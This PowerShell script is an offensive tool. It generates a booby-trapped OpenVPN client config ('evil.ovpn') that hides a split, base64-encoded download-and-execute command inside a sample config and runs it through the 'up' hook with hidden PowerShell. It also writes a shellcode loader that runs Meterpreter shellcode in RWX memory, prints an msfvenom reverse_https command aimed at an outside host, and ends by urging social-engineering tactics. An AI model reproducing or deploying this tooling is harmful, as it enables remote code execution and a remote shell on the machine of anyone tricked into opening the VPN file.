Set-StrictMode -Version 2

$powershell_template = @'
Set-StrictMode -Version 2

function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

If ([IntPtr]::size -eq 8) {
	[Byte[]]$var_code = [System.Convert]::FrOmBase64String('%DATA%')
	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
	$var_runme.Invoke([IntPtr]::Zero)
}
'@


$tempalte = @'
##############################################
# Sample client-side OpenVPN 2.0 config file #
# for connecting to multi-client server.     #
#                                            #
# This configuration can be used by multiple #
# clients, however each client should have   #
# its own cert and key files.                #
#                                            #
# On Windows, you might want to rename this  #
# file so it has a .ovpn extension           #
##############################################

# Specify that we are a client and that we
# will be pulling certain config file directives
# from the server.
# client

# Use the same setting as you are using on
# the server.
# On most systems, the VPN will not function
# unless you partially or fully disable
# the firewall for the TUN/TAP interface.
# ;dev tap
dev tun

# Windows needs the TAP-Win32 adapter name
# from the Network Connections panel
# if you have more than one.  On XP SP2,
# you may need to disable the firewall
# for the TAP adapter.
# ;dev-node MyTap

# Are we connecting to a TCP or
# UDP server?  Use the same setting as
# on the server.
# ;proto tcp
proto udp

# The hostname/IP and port of the server.
# You can have multiple remote entries
# to load balance between the servers.
remote 192.168.1.245
ifconfig 10.200.0.2 10.200.0.1

# Choose a random host from the remote
# list for load-balancing.  Otherwise
# try hosts in the order specified.
# ;remote-random

# Keep trying indefinitely to resolve the
# host name of the OpenVPN server.  Very useful
# on machines which are not permanently connected
# to the internet such as laptops.
# resolv-retry infinite


# Most clients don't need to bind to
# a specific local port number.
nobind

# Downgrade privileges after initialization (non-Windows only)
# ;user nobody
# ;group nobody

# Try to preserve some state across restarts.
persist-key
{first}
persist-tun

# If you are connecting through an
# HTTP proxy to reach the actual OpenVPN
# server, put the proxy server/IP and
# port number here.  See the man page
# if your proxy server requires
# authentication.
# ;http-proxy-retry # retry on connection failures
# ;http-proxy [proxy server] [proxy port #]

# Wireless networks often produce a lot
# of duplicate packets.  Set this flag
# to silence duplicate packet warnings.
;mute-replay-warnings
{second}

# SSL/TLS parms.
# See the server config file for more
# description.  It's best to use
# a separate .crt/.key file pair

# for each client.  A single ca
# file can be used for all clients.
# ca ca.crt
# cert client.crt
# key client.key
{thrid}
script-security 2

# Verify server certificate by checking that the
# certificate has the correct key usage set.
# This is an important precaution to protect against
# a potential attack discussed here:
{fourth}
#  http://openvpn.net/howto.html#mitm
#
# To use this feature, you will need to generate
# your server certificates with the keyUsage set to
#   digitalSignature, keyEncipherment
# and the extendedKeyUsage to
#   serverAuth
# EasyRSA can do this for you.
setenv kk 'start /min /b powershell /w hidden /enc %k0%%k1%%k2%%k3%'
# remote-cert-tls server
up 'C:\\Windows\\System32\\cmd.exe /c "(%kk%)|cmd"'

# If a tls-auth key is used on the server
# then every client must also have the key.
# tls-auth ta.key 1

# Select a cryptographic cipher.
# If the cipher option is used on the server
# then you must also specify it here.
# Note that v2.4 client/server will automatically
# negotiate AES-256-GCM in TLS mode.
# See also the data-ciphers option in the manpage
# cipher AES-256-CBC

# Enable compression on the VPN link.
# Don't enable this unless it is also
# enabled in the server config file.
#comp-lzo

# Set log file verbosity.
verb 0

# Silence repeating messages
;mute 20
'@

function handle_tempalte {
	Param ($first, $second, $thrid, $fourth)
    $tempalte = $tempalte.Replace('{first}',$first)
    $tempalte = $tempalte.Replace('{second}',$second)
    $tempalte = $tempalte.Replace('{thrid}',$thrid)
    return $tempalte.Replace('{fourth}',$fourth)
}

function handle_pstempalte {
	Param ($shellcode)
    return $powershell_template.Replace('%DATA%',$shellcode)
}

$url = Read-Host "Please enter your download url, Ex: http://192.168.114.165/a.ps1 :"
$file = Read-Host "Please enter your script name, Ex: a.ps1 :"
$raw_payload = "iex(New-Object Net.WebClient).DownloadString('{url}');{file}".Replace('{url}',$url).Replace('{file}',$file)
Write-Host $raw_payload
$b64_payload = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($raw_payload))
# split payload
$flag = $b64_payload.length/4
$evil_ovpn = handle_tempalte $b64_payload.Substring(0,55).Insert(0,"setenv k0 ") $b64_payload.Substring($flag,$flag).Insert(0,"setenv k1 ") $b64_payload.Substring($flag*2,$flag).Insert(0,"setenv k2 ") $b64_payload.Substring($flag*3,$flag).Insert(0,"setenv k3 ")
Out-File -FilePath .\evil.ovpn -InputObject $evil_ovpn -Encoding utf8
Write-Host "generate shellcode command: msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.114.165 lport=8888 -f base64"
$shellcode = Read-Host "Please enter your shellcode :"
$evil_ps = handle_pstempalte $shellcode
Out-File -FilePath .\evil.ps1 -InputObject $evil_ps -Encoding utf8
Write-Host "[*] Done! Host your evil.ps1 by 'python3 -m http.server 80' on your vps"
Write-Host "[+] please look at evil.ovpn, and show me your SET skill"
